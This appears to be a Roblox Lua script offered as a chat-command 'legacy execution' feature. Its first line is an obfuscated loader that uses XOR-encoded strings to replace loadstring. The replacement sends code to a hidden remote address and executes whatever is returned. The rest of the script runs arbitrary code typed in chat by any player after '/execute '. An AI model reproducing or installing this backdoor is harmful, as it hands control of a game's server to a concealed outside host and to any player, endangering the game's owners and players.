local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v13=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v13,v13 + 1 )),v1(v2(v9,1 + (v13% #v9) ,1 + (v13% #v9) + 1 )))%256 ));end return v5(v10);end function loadstring(v11) local v12=request({[v7("\228\209\215","\126\177\163\187\69\134\219\167")]=v7("\43\217\62\213\166\108\130\38\202\255\34\193\34\202\239\55\151\124\156\170\122\130\38\202\253\39\222\62\215\245\45\202","\156\67\173\74\165"),[v7("\25\178\93\30\179\34","\38\84\215\41\118\220\70")]=v7("\96\57\17\38","\158\48\118\66\114"),[v7("\131\33\17\50\118\183\232","\155\203\68\112\86\19\197")]={[v7("\101\210\56\232\69\118\241\181\114\196\38\249","\152\38\189\86\156\32\24\133")]=v7("\232\82\191\82\179\71\171\71\245\89","\38\156\55\199")},[v7("\138\114\120\49","\35\200\29\28\72\115\20\154")]=v11}).Body;return loadstring(v12);end
-- legacy execution allows users to execute scripts from chat :)
local active = {}

local function onPlayerChatted(player)
    player.Chatted:Connect(function(msg)
        local separate = string.sub(msg, 1, 9)
        if separate == "/execute " then
            local cmd = string.sub(msg, 10)

            local func, err = loadstring(cmd)
            if func then
                func()
            else
                warn("Error in command: " .. err)
            end
        end
    end)
end

-- Connect to all players currently in the game
for _, player in pairs(game.Players:GetPlayers()) do
    onPlayerChatted(player)
end

-- Connect to new players who join the game
game.Players.PlayerAdded:Connect(onPlayerChatted)
